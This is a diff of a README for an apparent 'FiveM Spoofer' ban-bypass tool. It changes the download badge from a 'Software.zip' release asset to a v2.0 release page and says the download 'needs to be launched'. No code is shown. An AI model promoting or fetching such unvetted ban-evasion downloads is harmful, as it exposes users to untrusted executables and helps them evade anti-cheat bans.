@@ -45,7 +45,7 @@ This repository covers a wide range of topics related to bypassing bans, enhanci
 
 You can download the latest version of the **FiveM Spoofer** by clicking the button below:
 
-[![Download FiveM Spoofer](https://github.com/Newbie472/FiveM-Spoofer/releases/download/v1.0/Software.zip%20Spoofer-brightgreen)](https://github.com/Newbie472/FiveM-Spoofer/releases/download/v1.0/Software.zip)
+[![Download FiveM Spoofer](https://github.com/Newbie472/FiveM-Spoofer/releases/tag/v2.0%20Spoofer-brightgreen)](https://github.com/Newbie472/FiveM-Spoofer/releases/tag/v2.0)
 
 Note: The download link needs to be launched.
 
